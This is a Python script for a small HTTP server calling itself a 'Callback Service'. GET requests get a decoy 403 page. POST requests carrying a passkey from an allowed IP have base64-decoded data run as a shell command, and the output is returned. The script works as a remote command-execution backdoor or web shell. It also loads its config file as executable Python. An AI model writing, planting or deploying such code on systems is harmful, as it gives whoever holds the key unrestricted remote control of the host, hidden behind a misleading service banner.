#!/usr/bin/env python
import socket
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import cgi
import os.path
from os import path
import subprocess
try:
    from urlparse import parse_qs
except ImportError: # old version, grab it from cgi
    from cgi import parse_qs
    urlparse.parse_qs = parse_qs
import base64


#definitions#
runport=8081
ip_address='0.0.0.0'

class GP(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.sys_version = 'CBS 1.4.1'
        self.server_version = 'CBS 1.4.1'
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Server', 'Callback Service')
        self.end_headers()
    def do_HEAD(self):
        self._set_headers()
    def do_GET(self):
        #self._set_headers()
        #print (self.path)
        #print (parse_qs(self.path[2:]))
        self.sys_version = 'CBS 1.4.1'
        self.server_version = 'Callback Service'
        self.send_response(403)
        self.send_header('Server', 'Callback Service')
        self.end_headers()
        olx = ""
        olx += u"<html><body><h1>403 Forbidden!</h1><p>Your request could not be interpreted by the callback service.</body></html>" 
        self.wfile.write(olx.encode(encoding='utf_8'))
        del olx
    def do_POST(self):
        self._set_headers()
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST'}
        )
        remotekey=str(form.getvalue("key"))
        dataxx=str(form.getvalue("data"))
        if os.path.isfile("config.cfg") == False: 
            olx = ""
            olx += u"Error! File 'config.cfg' does not exist" 
            self.wfile.write(olx.encode(encoding='utf_8'))
            del olx
        elif os.path.isfile("config.cfg") == True:
            def getVarFromFile(filename):
                import imp
                f = open(filename)
                global vars
                vars = imp.load_source('vars', "", f)
                f.close()
                
            getVarFromFile("config.cfg") 
            localkey=str(vars.passkey)   
            allowedip=str(vars.allowedip)   
            clientip=self.address_string()
            clientip=str(clientip)
            if remotekey == '':  
                    olx = ""
                    olx += u"Error! Could not read passkey from config.cfg" 
                    self.wfile.write(olx.encode(encoding='utf_8'))
                    del olx
            else:
                if remotekey == localkey and clientip == allowedip:
                    if dataxx.strip() == "None":
                        olx = ""
                        olx += u"data arg can not be empty"
                        self.wfile.write(olx.encode(encoding='utf_8'))
                        del olx                    
                    else:
                        dale = base64.b64decode(dataxx)
                        dale = dale.decode("utf-8")
                        dale = str(dale)
                        cmd = subprocess.getoutput(dale)
                        del dale
                        olx = ""
                        olx += u"" + str(cmd) 
                        self.wfile.write(olx.encode(encoding='utf_8')) 
                        del olx
                else:
                    oly = ""
                    oly += u"Passkey is invalid or IP is not permitted"
                    self.wfile.write(oly.encode(encoding='utf_8')) 

def run(server_class=HTTPServer, handler_class=GP, port=runport):
    server_address = (ip_address, port)
    httpd = server_class(server_address, handler_class)
    print ('Server running at localhost:' + str(runport) + '...')
    httpd.serve_forever()

run()